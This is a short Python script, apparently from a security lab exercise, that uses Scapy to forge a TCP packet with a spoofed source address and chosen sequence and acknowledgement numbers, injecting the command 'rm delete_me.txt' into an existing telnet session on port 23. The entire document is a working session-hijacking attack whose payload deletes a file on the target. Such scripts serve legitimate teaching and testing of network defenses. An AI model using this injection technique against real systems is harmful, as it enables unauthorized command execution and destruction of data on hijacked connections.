#!/usr/bin/python3
from scapy.all import *

# Define the IP and TCP layers
ip = IP(src="10.0.2.6", dst="10.0.2.5")
tcp = TCP(sport=57924, dport=23, flags="PA", seq=603444980, ack=3571350066)

# Define the payload data
data = "rm delete_me.txt\n"

# Construct the packet
pkt = ip / tcp / data

# Send the packet
send(pkt, verbose=1)